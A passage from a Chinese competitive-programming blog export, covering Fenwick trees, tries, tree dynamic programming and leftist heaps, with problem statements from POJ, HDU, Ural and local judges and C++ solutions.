#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define MAX 20020using namespace std;struct node&#123; int id,data;&#125;peo[MAX];long long e[MAX],t[MAX],data[MAX],lmin,rmin,lmax,rmax,ans;int n;bool cmp(node a,node b)&#123; return a.data&lt;b.data;&#125;int lowbit(int i)&#123; return -i&amp;i;&#125;void add(int x,int t)&#123; for(;x&lt;=n;x+=lowbit(x)) e[x]+=t;&#125;long long sum(int x)&#123; long long s=0; for(;x&gt;0;x-=lowbit(x)) s+=e[x]; return s;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int cas; scanf(\"%d\",&amp;cas); while(cas--)&#123; scanf(\"%d\",&amp;n); ans=0; memset(e,0,sizeof(e)); for(int i=1;i&lt;=n;i++)&#123; scanf(\"%d\",&amp;peo[i].data); peo[i].id=i;//位置 &#125; sort(peo+1,peo+1+n,cmp);//按能力排序 add(peo[1].id,1);//实力最小的选手 for(int i=2;i&lt;=n-1;i++)&#123; lmin=sum(peo[i].id-1); lmax=peo[i].id-lmin-1; rmin=sum(n)-sum(peo[i].id); rmax=n-peo[i].id-rmin; ans+=(lmin*rmax+lmax*rmin); add(peo[i].id,1); &#125; printf(\"%lld\\n\",ans); &#125; return 0;&#125; Stars 题目（POJ 2352） 天文学家常常检查星星地图，星星都有它的x,y坐标，星星的等级的是由下边星星数量和星星右边的星星数量决定。 例如,看看上面的星图。星星5的等级为3 (由星星1、2和4决定的)。星星2的等级为1（由星星1决定的）。在这张地图上0级的星星有一颗，1级的星星有两颗，2级的星星有一颗，3级的星星有一颗， 你要编写一个程序,计算每个等级的星星的数量。 输入： 第一行为星星的数量N（(1&lt;=N&lt;=15000) 接下来N行，每行为星星的x,y坐标，用空格来分开(0&lt;=X,Y&lt;=32000)，每一个点上只有一个星星，按Y的升序给出坐标，如果Y相同，则按照X的升序给出。 输出： 输出应该包含N行,每行一个数字。第一行0级星星的数量,第二行1级星星的数量等等,最后一行包含n – 1星星的数量。 输入样例： 5 1 1 5 1 7 1 3 3 5 5 输出样例： 1 2 1 1 0 乍一看像一道二位树状数组题，其实是一维的，因为数据本来就是按y的大小排序，添加每个点x之前先计算sum(x)，这就是星星的等级，加入答案，继续直到循环结束 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define MAX 32020using namespace std;int e[MAX],cnt[MAX],n;int lowbit(int i)&#123; return -i&amp;i;&#125;void add(int x,int t)&#123; for(;x&lt;=MAX;x+=lowbit(x)) e[x]+=t;&#125;int sum(int x)&#123; int s=0; for(;x&gt;0;x-=lowbit(x)) s+=e[x]; return s;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int x,y; while(~scanf(\"%d\",&amp;n))&#123; memset(e,0,sizeof(e)); memset(cnt,0,sizeof(cnt)); for(int i=1;i&lt;=n;i++)&#123; scanf(\"%d%d\",&amp;x,&amp;y); add(x+1,1); cnt[sum(x+1)]++; &#125; for(int i=1;i&lt;=n;i++) printf(\"%d\\n\",cnt[i]); &#125; return 0;&#125; ​ Hdu 4031 attack 问题描述 今年是911的十周年，基地组织又想攻击美国了，美国有建设了一堵墙来保护自己，而基地组织有一个超级武器，每秒钟可以攻击连续的墙。而美国还有能量护盾来保护墙，每个能量护盾覆盖在一个单位长度的墙上，能抵挡攻击，但是每个能量护盾防御了一次攻击都需要T秒时间冷却下来，冷却期间，它不能抵挡攻击，比如该单位初盾牌抵挡了第k次攻击，那么它不能抵挡第k+1~(k+t-1)次攻击，过后，他们自动继续防御。 在战争中，知己知彼是非常重要的，因此指挥官想知道墙的某一部分被成功攻击了多少次，成功攻击就意味着盾牌没有防御到 输入 第一行T(&lt;=20)，表示测试数据组数 每组测试数据第一行：N,Q,T，分别表示墙的长度，Q次攻击或询问，T秒的冷却时间 接下来Q行，格式有两种： Attack si ti 攻击 si 到 ti 的墙. 1 ≤ si ≤ ti ≤ N Query p 询问p位置的墙：1 ≤ p ≤ N 1 ≤ N, Q ≤ 20000 1 ≤ t ≤ 50 输出 每组数据第一行： Case i: 接下来是所有询问的答案，每个询问答案一行 样例输入 2 3 7 2 Attack 1 2 Query 2 Attack 2 3 Query 2 Attack 1 3 Query 1 Query 3 9 7 3 Attack 5 5 Attack 4 6 Attack 3 7 Attack 2 8 Attack 1 9 Query 5 Query 3 样例输出 Case 1: 0 1 0 1 Case 2: 3 2 暂时没A，先放这里吧~ Poj 2985 The k-th Largest Group 题意 有N只猫，M个操作。操作种类如下： 0 a b：把a b猫所在的组合并 1 k： 第K大的组的大小是多少。 求第k大的数 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=200020;int father[MAX],e[MAX];int cnt[MAX];//存储有i只猫的集合数 int n,m,op,a,b,num;int lowbit(int x)&#123; return -x&amp;x;&#125;void add(int x,int t)&#123; for(;x&lt;=MAX;x+=lowbit(x)) e[x]+=t;&#125;int Getfather(int p)&#123; if(father[p]!=p) father[p]=Getfather(father[p]); return father[p];&#125;int Get_kth(int k)&#123; int ans,tot;//二分找第k小 ans=tot=0; for(int i=20;i&gt;=0;i--)&#123; ans+=1&lt;&lt;i;//尝试 if(ans&gt;=MAX||tot+e[ans]&gt;=k)//看这次尝试是否超过范围 ans-=1&lt;&lt;i;//复原 else tot+=e[ans];//记录 &#125; return ans+1;&#125;int main()&#123; scanf(\"%d%d\",&amp;n,&amp;m); for(int i=1;i&lt;=n;i++)&#123; father[i]=i;//并查集初始化 cnt[i]=1;//表示组内有i只猫的组数，开始只有一组 &#125;num=n;//num个集合 add(1,n); for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d\",&amp;op); if(op)&#123; scanf(\"%d\",&amp;a);//第k大就是第num - k + 1小的 printf(\"%d\\n\",Get_kth(num-a+1)); &#125;else&#123; scanf(\"%d%d\",&amp;a,&amp;b); a=Getfather(a); b=Getfather(b);//取父亲 if(a==b) continue;//本来属于一个集合 add(cnt[a],-1); add(cnt[b],-1); add(cnt[a]+cnt[b],1); cnt[b]=cnt[a]+cnt[b]; father[a]=b; num--; &#125; &#125; return 0;&#125; Poj 1195 Mobile phones 题意： 给你一个矩阵（初始化为0）和一些操作： 1 x y a表示在arr[x][y]加上a 2 l b rt 表示求左上角为(l,b),右下角为(r,t)的矩阵的和。 高维树状数组即可 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=1200;int e[MAX][MAX],n;int lowbit(int i)&#123; return -i&amp;i;&#125;int sum(int x,int y)&#123; int ans=0; while(x&gt;0)&#123; int ty=y; while(ty&gt;0)&#123; ans+=e[x][ty]; ty-=lowbit(ty); &#125; x-=lowbit(x); &#125; return ans;&#125;void add(int x,int y,int t)&#123; while(x&lt;=n)&#123; int ty=y; while(ty&lt;=n)&#123; e[x][ty]+=t; ty+=lowbit(ty); &#125; x+=lowbit(x); &#125;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int c,x,y,a,x1,x2,y1,y2; scanf(\"%d%d\",&amp;c,&amp;n); while(~scanf(\"%d\",&amp;c)&amp;&amp;c!=3)&#123; if(c==1)&#123; scanf(\"%d%d%d\",&amp;x,&amp;y,&amp;a); add(x+1,y+1,a); &#125;else&#123; scanf(\"%d%d%d%d\",&amp;x1,&amp;y1,&amp;x2,&amp;y2); int ans=sum(x2+1,y2+1)-sum(x1,y2+1)-sum(x2+1,y1)+sum(x1,y1); printf(\"%d\\n\",ans); &#125; &#125; return 0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"字典树总结","slug":"e5-ad-97-e5-85-b8-e6-a0-91-e6-80-bb-e7-bb-93","date":"2018-12-06T15:45:45.000Z","updated":"2019-05-04T15:39:44.406Z","comments":true,"path":"posts/e073dc73/","link":"","permalink":"https://mrh1s.top/posts/e073dc73/","excerpt":"","text":"字典树总结在实际生活中，图书馆、书店都会遇到一种麻烦，就是不知道如何储存所有的书名，因为藏书实在是太多了。这种情形非常常见。 由此单词查找树便出现了：Trie树，是一种树形结构，是一种哈希树的变种，它通过储存大部分字符串的前缀来达到不仅是存储空间而且是查找效率的优化。 字典树的操作大致分为三种：插入字符串、查找字符串、删除字符串。 首先我们要构造一棵树。根节点编号设置为1。这个结点没有实际意义，只作为查找的起点。 注意：虽然有些结点存在，但有可能并不是由这个结点所对应的字符串所生成的。打个比方：我添加了“memset”字符串，m-&gt;e结点已经生成，但我查找“me”时，这个字符串是否存在呢？ 因此，我们还需要开一个exist数组，用于记录一个字符串的结尾，遍历到这个结点，而且此结点exist，才能说明这个字符串存在。 插入字符串 基本思路是一个个字符进行比对，如果有相应的结点，就直接进入，直到找不到下一个结点时，再在这个结点上生枝。这个操作会同时用到查找的相关操作，所以可以和查找操作结合起来。注意：字符串插入成功后要把结尾的结点exist标为1。 查找字符串 鉴于插入操作也要用到这步，我们可以把函数的返回值设置为：如果找到字符串就返回0，否则返回最后一次匹配到的结点位置。 删除字符串 将本结点删除，并不代表它的树枝也要被剪掉，所以直接查找字符串末尾的结点位置，exist标记为0即可。 另外：生成的结点可以被压缩，比如某些经常出现的词缀可以被压缩成一个结点，这样的编程复杂度的确不小，但是可以节省不少的空间。 1635: 图书管理时间限制: 1 Sec 内存限制: 64 MB 题目描述图书管理是一件十分繁杂的工作，图书馆每天都会有许多新书缴入，为了更方便管理图书（以便于帮助想要结束的客人快速查找是否有他们所需要的书），我们需要设计一个图书朝着系统，该系统需要支持两种操作： 1）add(s)，表示新加入一本书名为s的图书； 2）find（s)，表示查询是否存在一本书名为s的图书； 输入第一行包括一个正整数n（n≤10000），表示操作数。 以下n行，每行所给出两个操作中的一种，指令格式为： add s find s 在书名s与指令间有一个空格，保证书名长度都不超过200，可以加上读入数据是准确无误的。 输出对于每个find指令，对应输出一行yes或no，表示该书是否存在。注意：开始时图书馆没有一本书，另外书名区分大小写。 样例输入4 add Inside C# find Effective Java add Effective Java find Effective Java 样例输出no yes #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=3000000;char str[220],data[MAX],kind[5];int first[MAX],nxt[MAX],go[MAX],exist[MAX],pnum=1,arcnum;void addarc(int a,int b)&#123; nxt[++arcnum]=first[a]; first[a]=arcnum; go[arcnum]=b;&#125;int u,len;int Find(int len)&#123;//如果查找到就返回0 未找到时返回第一位未匹配的位置 int v,nextpoi; u=1; for(int i=1;i&lt;=len;i++)&#123; nextpoi=-1; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; if(data[v]==str[i])&#123; nextpoi=v; break; &#125; &#125; if(nextpoi!=-1) u=nextpoi; else return i;//在i位置时匹配错误 &#125; if(!exist[u]) return len+1;//虽然有结点，但是没有存数据 return 0;//成功找到字符串 &#125; void Insert(int t)&#123;//从字符串的t位置开始插入 if(t==len+1)&#123;//有结点，但是没有数据 exist[u]=1; return; &#125; for(int i=t;i&lt;=len;i++)&#123; addarc(u,++pnum); data[pnum]=str[i]; u=pnum; &#125; exist[u]=1;//标记当前字符串的结尾 &#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,t,maxx=-1; scanf(\"%d\",&amp;n); for(int i=1;i&lt;=n;i++)&#123;//将字符串插入字典树 scanf(\"%s\",kind); getchar(); gets(str+1); len=strlen(str+1); if(kind[0]=='a') Insert(Find(len)); else&#123; t=Find(len); if(t==0) printf(\"yes\\n\"); else printf(\"no\\n\"); &#125; &#125; return 0;&#125; ​","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"树形动态规划总结","slug":"e6-a0-91-e5-bd-a2-e5-8a-a8-e6-80-81-e8-a7-84-e5-88-92-e6-80-bb-e7-bb-93","date":"2018-12-06T15:45:21.000Z","updated":"2019-05-05T05:21:16.884Z","comments":true,"path":"posts/8e2c30b/","link":"","permalink":"https://mrh1s.top/posts/8e2c30b/","excerpt":"","text":"树形动规总结 树型动规的基本方式同普通的线性动态规划，但遍历的顺序是由高深度向低深度直至根节点，通常一个树型动规包括了状态、阶段、决策、状态转移方程，找到每个题目对应的动归要素，是一个题目的难点所在。 状态：程序求解到每个程度所储存的信息，通常我们需要在一开始找到适合题目的状态并进行定义。Tips：找状态可以通过确定变量，权衡变量的范围来寻找。 阶段：就是求解动态规划的顺序，每次求解的状态都必须运用之前已经求解过的作为辅助。 决策：选择最优解的过程，通常是求最大值，最小值等。 状态转移方程：思考出决策后，用状态转移方程将其表达出来。 关于求解顺序：由于树形动归的特殊性（几乎都是无向边），我们应该从叶子节点开始遍历，有三种方法： 先给树做一次BFS，然后将队列中的元素一一出队，就是树型动规的顺序。 找度为2的节点，记录，并且更新它的子节点的度数，重复这个拓扑排序操作，得到的也是树型动规的顺序。 用递归将树的后序遍历求出，即可将一棵树线性化 拓展：状态压缩 当我们的某个状态过于繁琐，很难将其用一个维度表示出来，怎么办？ 如山贼集团题目，设立分部的时候各个分部会互相影响，而且不同的分部之间影响的情况是不同的，不像我们通常的动归，所有的物品一视同仁。 比如某结点选择1、2、3分部，会导致总资金损失，而选择1、4分部，总资金却会增加…… 观察分部的总数量，小于等于8，这个时候我们可以用到位运算的相关知识，将1~8分部的选择情况用一个int变量储存起来，从而起到表示状态的作用。 Ural 1039没有上司的晚会 背景 有个公司要举行一场晚会。 为了能玩得开心，公司领导决定：如果邀请了某个人，那么一定不会邀请他的上司 （上司的上司，上司的上司的上司……都可以邀请）。 题目 每个参加晚会的人都能为晚会增添一些气氛，求一个邀请方案，使气氛值的和最大。 输入格式 第1行一个整数N（1&lt;=N&lt;=6000）表示公司的人数。 接下来N行每行一个整数。第i行的数表示第i个人的气氛值x(-128&lt;=x&lt;=127)。 接下来每行两个整数L，K。表示第K个人是第L个人的上司。 输入以0 0结束。 输出格式 一个数，最大的气氛值和。 样例输入 7 1 1 1 1 1 1 1 1 3 2 3 6 4 7 4 4 5 3 5 0 0 样例输出 5 提交地址： http://acm.timus.ru/submit.aspx?space=1&amp;num=1039 首先定义状态：每个结点，然后我们发现在一个人在不参与聚会时，它的相邻子节点可以参加聚会，也可以不参加；一个人参与聚会时，它的相邻子节点一定不能参与聚会。我们加一个状态：参与或者不参与聚会。 dp[i][j]表示第i个人参与(j==1)或不参与(j==0)聚会时聚会所能达到的最大气氛值 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=8000;int w[MAX],f[MAX][2],l,k,rt;int que[MAX],top,rear,father[MAX];int first[MAX],nxt[MAX],go[MAX],arcnum;void addarc(int a,int b)&#123; nxt[++arcnum]=first[a]; first[a]=arcnum; go[arcnum]=b;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n; scanf(\"%d\",&amp;n); for(int i=1;i&lt;=n;i++) scanf(\"%d\",&amp;w[i]); while(scanf(\"%d%d\",&amp;l,&amp;k)!=EOF&amp;&amp;l!=0&amp;&amp;k!=0)&#123; father[l]=k; addarc(k,l); &#125; /* for(int i=1;i&lt;=n;i++)&#123; printf(\"%d \",i); for(int p=first[i];p!=0;p=nxt[p])&#123; int j=go[p]; printf(\"%d \",j); &#125; printf(\"\\n\"); &#125;printf(\"\\n\");*/ for(int i=1;i&lt;=n;i++) if(!father[i])&#123; rt=i; break; &#125; que[rear++]=rt; do&#123; for(int p=first[que[top++]];p!=0;p=nxt[p]) que[rear++]=go[p]; &#125;while(top!=rear); for(int k=top-1;k&gt;=0;k--)&#123; int i=que[k]; if(first[i]==0)&#123; f[i][0]=0; f[i][1]=w[i]; &#125;else&#123; int sum,j; sum=0; for(int p=first[i];p!=0;p=nxt[p])&#123; j=go[p]; sum+=max(f[j][0],f[j][1]); &#125; f[i][0]=sum; sum=0; for(int p=first[i];p!=0;p=nxt[p])&#123; j=go[p]; sum+=f[j][0]; &#125; f[i][1]=sum+w[i]; &#125; &#125; printf(\"%d\",max(f[rt][0],f[rt][1]));/* printf(\"\\n\"); for(int i=1;i&lt;=n;i++)&#123; printf(\"%d %d\\n\",f[i][0],f[i][1]); &#125;*/ return 0;&#125; ​ ​ POJ 1985 Cow Marathon 题目大意 求一棵树的最长路径 输入： 第一行：n,m (2 &lt;= N &lt;= 40,000,1 &lt;= M&lt; 40,000)，表示有n个节点，m条边 接下来m行： 每行四个量：a b w c，表示a与b之间有一条权值为w的路径，将c忽略掉 输出： 最长路径长度 模版题 但是WA了，就不给代码了。。。。 Ural 1018 二*苹果树 题目 有一棵苹果树，如果树枝有分叉，一定是分2叉（就是说没有只有1个儿子的结点）这棵树共有N个结点（叶子点或者树枝分叉点），编号为1-N,树根编号一定是1。我们用一根树枝两端连接的结点的编号来描述一根树枝的位置。下面是一颗有4个树枝的树2 5\\ /3 4\\ /1 现在这颗树枝条太多了，需要剪枝。但是一些树枝上长有苹果。给定需要保留的树枝数量，求出最多能留住多少苹果。 输入格式 第1行2个数，N和Q(1&lt;=Q&lt;=N,1&lt;N&lt;=100)。N表示树的结点数，Q表示要保留的树枝数量。接下来N-1行描述树枝的信息。每行3个整数，前两个是它连接的结点的编号。第3个数是这根树枝上苹果的数量。每根树枝上的苹果不超过30000个。 输出格式 一个数，最多能留住的苹果的数量。 样例输入 5 21 3 11 4 102 3 203 5 20 样例输出 21 状态：结点、树所保留的树枝数量。 f[i][j]表示在第i个结点以下的子树保留j个树枝所能保留的最大苹果数 分配树枝需要枚举分配给整个子树的树枝数、再枚举分给左右子树的树枝各有多少，注意这里分给左右子树树枝的同时会损失掉两根树枝 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=1000;int first[MAX],nxt[MAX],go[MAX],w[MAX][MAX],arcnum;int f[MAX][MAX],father[MAX],lch[MAX],rch[MAX],vis[MAX];int que[MAX],top,rear;void addarc(int a,int b,int c)&#123; nxt[++arcnum]=first[a]; first[a]=arcnum; go[arcnum]=b; w[a][b]=c;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,q,a,b,c; scanf(\"%d%d\",&amp;n,&amp;q); for(int i=1;i&lt;=n-1;i++)&#123; scanf(\"%d%d%d\",&amp;a,&amp;b,&amp;c); addarc(a,b,c); addarc(b,a,c); &#125; que[rear++]=1; vis[1]=1; do&#123; int u=que[top++],v; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; if(vis[v]) continue; if(!lch[u]) lch[u]=v; else rch[u]=v; que[rear++]=v; vis[v]=1; &#125; &#125;while(top!=rear); for(int k=top-1;k&gt;=0;k--)&#123; int i=que[k]; if(!lch[i]) continue; for(int j=1;j&lt;=q;j++)&#123;//分配j个树枝 f[i][j]=max(f[i][j],max(f[lch[i]][j-1]+w[i][lch[i]],f[rch[i]][j-1]+w[i][rch[i]]));//单独分配 for(int j0=1;j0&lt;j;j0++)&#123;//两个都分配 int lw=f[lch[i]][j0-1]+w[i][lch[i]]; int rw=f[rch[i]][j-j0-1]+w[i][rch[i]]; f[i][j]=max(f[i][j],lw+rw); &#125; &#125; &#125; printf(\"%d\",f[1][q]); return 0;&#125; **POJ1155有限电视网络 有一棵N个节点的树，树上有M个叶子节点，对应M个用户，其余为转发站，1号节点为根，电视台在1号节点，节目从一个地方传到另一个地方都要费用，同时每一个用户愿意出相应的钱来收看节目。求在电视台不亏本的前提下，最多允许有多少个用户可以看到电视节目。 规模： N&lt;=3000 M&lt;N 输入： N M N表示转发站和用户总数，M为用户数 以下N-M行，第i行第一个K，表示转发站i和K个（转发站或用户）相连,其后第j对数val,cost表示，第i个转发站到val有边，费用cost. 最后一行M个数表示每个用户愿意负的钱。 输出： 不亏本前提下，可以收到节目最多的用户数。 （如果某个用户要收到节目（叶子结点），那么电视台到该用户的路径节点的费用都要付） 思路:在树上进行背包，对于以u为根的子树,该子树供给给j个用户亏本的最少钱 此题用平常的思维一般会想到用f[i][j]的i表示结点，j表示盈亏费用，f[i][j]就刚好表示用户的数量，但是盈亏费用并不是一个很好的量，它的范围很大，即使用动态规划也会很耗时间，所以我们只能将f[i,j]表示在以i为根的树上允许j的用户数，最大能赚到（最少亏损）的钱 在最后全部遍历一边，最先被发现f[i][j]&gt;=0的i就是答案 另外还有一个问题，一个根结点有多个子节点，不像二叉苹果树那么容易枚举出来，这里可以用到一些01背包的思想，如果用动态规划来求解这个动态规划的状态转移方程，将每个子节点看作物品，分配的则是对应的用户数，能在较快的时间内求出状态 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAXN=3020;const int MAXM=8000;int first[MAXN],nxt[MAXM],go[MAXM],w[MAXM],arcnum;int dp[MAXN][MAXN],sum[MAXN],temp[MAXN];void addarc(int a,int b,int c)&#123; nxt[++arcnum]=first[a]; first[a]=arcnum; go[arcnum]=b; w[arcnum]=c;&#125;void DFS(int u)&#123; for(int p=first[u];p!=0;p=nxt[p])&#123; int v=go[p]; DFS(v); for(int j=0;j&lt;=sum[u];j++) temp[j]=dp[u][j]; for(int j=0;j&lt;=sum[u];j++) for(int k=1;k&lt;=sum[v];k++) dp[u][k+j]=max(dp[u][k+j],temp[j]+dp[v][k]-w[p]); sum[u]+=sum[v]; &#125;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,m,b,c,t; scanf(\"%d%d\",&amp;n,&amp;m); for(int i=1;i&lt;=n;i++)&#123;//不能用memset,会使一个数负得太多从而变成正值 for(int j=1;j&lt;=m;j++) dp[i][j]=-10000000; &#125; for(int i=1;i&lt;=n-m;i++)&#123; scanf(\"%d\",&amp;t); sum[i]=0; while(t--)&#123; scanf(\"%d%d\",&amp;b,&amp;c); addarc(i,b,c); &#125; &#125; for(int i=n-m+1;i&lt;=n;i++)&#123; sum[i]=1; scanf(\"%d\",&amp;dp[i][1]); &#125; DFS(1); for(int i=m;i&gt;=0;i--) if(dp[1][i]&gt;=0)&#123; printf(\"%d\",i); break; &#125; return 0;&#125; 山贼集团 时间限制：4s 空间限制：256MB 题目描述 某山贼集团在绿荫村拥有强大的势力，整个绿荫村由N个连通的小村落组成，并且保证对于每两个小村落有且仅有一条简单路径相连。小村落用阿拉伯数字编号为1,2,3,4,…,n，山贼集团的总部设在编号为1的小村落中。山贼集团除了老大坐镇总部以外，其他的P个部门希望在村落的其他地方建立分部。P个分部可以在同一个小村落中建设，也可以分别建设在不同的小村落中。每个分部到总部的路径称为这个部门的管辖范围，于是这P个分部的管辖范围可能重叠，或者完全相同。在不同的村落建设不同的分部需要花费不同的费用。每个部门可能对他的管辖范围内的小村落收取保护费，但是不同的分部如果对同一小村落同时收取保护费，他们之间可能发生矛盾，从而损失一部分的利益，他们也可能相互合作，从而获取更多的利益。现在请你编写一个程序，确定P个分部的位置，使得山贼集团能够获得最大的收益。 输入格式(cateran.in) 输入文件第一行包含一个整数N和P，表示绿荫村小村落的数量以及山贼集团的部门数量。 接下来N-1行每行包含两个整数X和Y，表示编号为X的村落与编号为Y的村落之间有一条道路相连。(1&lt;=X,Y&lt;=N) 接下来N行，每行P个正整数，第i行第j个数表示在第i个村落建设第j个部门的分部的花费Aij。 然后有一个正整数T，表示下面有T行关于山贼集团的分部门相互影响的代价。(0&lt;=T&lt;=2p) 最后有T行，每行最开始有一个数V，如果V为正，表示会获得额外的收益，如果V为负，则表示会损失一定的收益。然后有一个正整数C，表示本描述涉及的分部的数量，接下来有C个数，Xi，为分部门的编号(Xi不能相同)。表示如果C个分部Xi同时管辖某个小村落（可能同时存在其他分部也管辖这个小村落），可能获得的额外收益或者损失的收益为的|V|。T行中可能存在一些相同的Xi集合，表示同时存在几种收益或者损失。 输出格式(cateran.out) 输出文件要求第一行包含一个数Ans，表示山贼集团设置所有分部后能够获得的最大收益。 样例数据 输入样例 输出样例 2 1 1 2 2 1 1 3 1 15 数据规模 对于40%的数据，1&lt;=P&lt;=6。 对于100%的数据，1&lt;=N&lt;=100，1&lt;=P&lt;=12，保证答案的绝对值不超过108。 题目并不难，难在储存各个不同分部的分配方法上，前文讲到可以使用状态压缩的方式，这里给出一种具体的实现方法： for(int j’= j ;j’&gt;=0;j’=(j’-1)&amp;j){ } 其中的j’就是j方案的一个补集，反复循环，直到遍历到空集才结束 如00010011表示选4、7、8分部 则它的补集为： S1=00010010&amp;00010011=00010010 4、7分部 S2=00010001&amp;00010011=00010001 4、8分部 S3=00010000&amp;00010011=00010000 4分部 S4=00001111&amp;00010011=00000011 7、8分部 S5=00000010&amp;00010011=00000010 7分部 S6=00000001&amp;00010011=00000001 8分部 S7=00000000&amp;00010011=0","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"可并堆之左偏树总结","slug":"e5-8f-af-e5-b9-b6-e5-a0-86-e4-b9-8b-e5-b7-a6-e5-81-8f-e6-a0-91-e6-80-bb-e7-bb-93","date":"2018-12-06T15:45:00.000Z","updated":"2019-05-04T15:39:44.407Z","comments":true,"path":"posts/28355435/","link":"","permalink":"https://mrh1s.top/posts/28355435/","excerpt":"","text":"可并堆之左偏树总结左偏树，顾名思义，是左边的结点权值较大的树形数据结构。主要用于两个优先队列的快速合并，是可并堆的一种实现方式。 定义与性质： 外结点：一个结点的右子结点为空就为外结点 距离：结点一直向右，直到外结点所经历的步数，每个结点距离等于右儿子的距离+1。 左偏树的父亲结点的优先级高于儿子结点 父亲结点的左子节点的距离大于等于右子节点的距离 合并操作： 大体流程：递归操作，将b结点与a结点的右孩子合并，同时会将b结点的左右孩子合并……以此类推，然后根据实际情况维护左孩子与右孩子的位置顺序 伪代码： merge(a,b)//a与b都是小顶堆 { If(a==null) return b;//a为空，根节点为b If(b==null) return a;//b为空，根节点为a If(key(a)&gt;key(b)) swap(a,b);//将优先级高树的放在左边，左右子树调换位置 a.rchild=Merge(a.rchild,b);//a作为根，a的右孩子和b作为孩子递归 If(dis[a.rchild]&gt;dis[a.lchild]) swap(a.lchild,a.rchild);//a的孩子节点排序 dis[a]=dis[a.rchild]+1;//a的距离更新 return a;//返回根节点 } 插入操作：将新结点当作只有一个根的左偏树，merge合并。 删除操作：直接删除根结点，合并左右子树。 1636:猴王时间限制:1 Sec 内存限制:128 MB 提交:32 解决:6 [提交][状态][讨论版] 题目描述很久很久以前，在一个广阔的森林里，住着n只好斗的猴子。起初，它们各干各的，互相之间也不了解。但是这并不能避免猴子们之间的争吵，当然，这只存在于两个陌生猴子之间。当两只猴子争论时，它们都会请自己最强壮的朋友来代表自己进行决斗。显然，决斗之后，这两只猴子以及它们的朋友就互相了解了，这些猴子之间将再也不会发生争论了，即使它们曾经发生过冲突。 假设每一只猴子都有一个强壮值，每次决斗后都会减少一半(比如10会变成5，5会变成2.5)。并且我们假设每只猴子都很了解自己。就是说，当它属于所有朋友中最强壮的一个时，它自己会站出来，走向决斗场。 输入输入分为两部分。 第一部分，第一行有一个整数n(n&lt;=100000)，代表猴子总数。 接下来的n行，每行一个数表示每只猴子的强壮值(小于等于32768)。 第二部分，第一行有一个整数m(m&lt;=100000)，表示有m次冲突会发生。 接下来的m行，每行包含两个数x和y，代表第x个猴子和第y个猴子之间发生冲突。 输出输出每次决斗后在它们所有朋友中的最大强壮值。数据保证所有猴子决斗前彼此不认识。 样例输入5 20 16 10 10 4 4 2 3 3 4 3 5 1 5样例输出8 5 5 10 很经典的左偏树题，每次两只猴子打架之后将两只猴子所属的堆合并起来，并且将最强壮的猴子置于堆顶 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=1000000;int lch[MAX],rch[MAX],father[MAX],dis[MAX],data[MAX];int n,m;bool cmp(int a,int b)&#123; return a&gt;b;&#125;int Merge(int a,int b)&#123; if(a==0) return b; if(b==0) return a; if(!cmp(data[a],data[b])) swap(a,b); rch[a]=Merge(rch[a],b); father[rch[a]]=a;//记录父亲 if(dis[rch[a]]&gt;dis[lch[a]]) swap(lch[a],rch[a]);//a的距离必须大于b dis[a]=dis[rch[a]]+1;//a的距离更新 return a;&#125;int Getfather(int p)&#123; if(father[p]==p) return p; father[p]=Getfather(father[p]); return father[p];&#125;void Fight(int a,int b)&#123;//这里将aa bb先删除,再与他们儿子合并后的树合并，再将两个堆合并，使左偏树符合堆的性质 int temp,xroot,yroot,aa,bb; aa=Getfather(a); bb=Getfather(b);//找到战斗力最强的猴子aa,bb data[aa]&gt;&gt;=1; data[bb]&gt;&gt;=1;//战斗力减少一半 temp=Merge(lch[aa],rch[aa]);//合并aa猴子的后代 lch[aa]=rch[aa]=0; xroot=Merge(aa,temp);//aa猴子与aa猴子后代合并 temp=Merge(lch[bb],rch[bb]);//合并bb猴子 的后代 lch[bb]=rch[bb]=0; yroot=Merge(bb,temp);//bb猴子与bb猴子后代合并 temp=Merge(xroot,yroot);//合并得到当前最强壮的猴子 father[a]=father[b]=father[aa]=father[bb]=father[xroot]=father[yroot]=temp; printf(\"%d\\n\",data[temp]);&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int a,b; scanf(\"%d\",&amp;n); for(int i=1;i&lt;=n;i++) scanf(\"%d\",&amp;data[i]); for(int i=1;i&lt;=n;i++) father[i]=i; scanf(\"%d\",&amp;m); for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d\",&amp;a,&amp;b); Fight(a,b); &#125; return 